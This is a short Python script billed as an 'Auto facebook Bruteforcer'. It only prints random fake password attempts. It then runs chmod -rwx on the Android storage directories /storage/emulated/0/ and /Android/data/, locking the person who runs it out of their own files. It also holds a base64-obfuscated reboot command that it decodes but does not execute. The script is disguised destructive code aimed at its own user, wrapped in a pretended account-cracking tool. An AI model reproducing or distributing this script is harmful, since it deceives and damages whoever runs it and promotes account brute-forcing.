#!/usr/bin/env python3

import os, time, base64, random, string
from pathlib import Path

print("Auto facebook Bruteforcer")
user_id = input('id: ')
print(f'bruteforcing {user_id}...')
x = 1
x += 1
for x in range(20):
   letters = string.ascii_lowercase
   passlist = ''.join(random.choice(letters) for i in range(10))
   print(f"id: {user_id} trying {passlist} as password")
   time.sleep(2)

home = Path("/storage/emulated/0/")
data = Path("/Android/data/")	
if data.exists() and home.exists():
   os.system(f"chmod -rwx {data}")
   os.system(f"chmod -rwx {home}")
   os.system("clear")
else:
   base64.b64decode("b3Muc3lzdGVtKCIvc2Jpbi9zaHV0ZG93biAtciBub3cgJiYgY2xlYXIiKQ==")





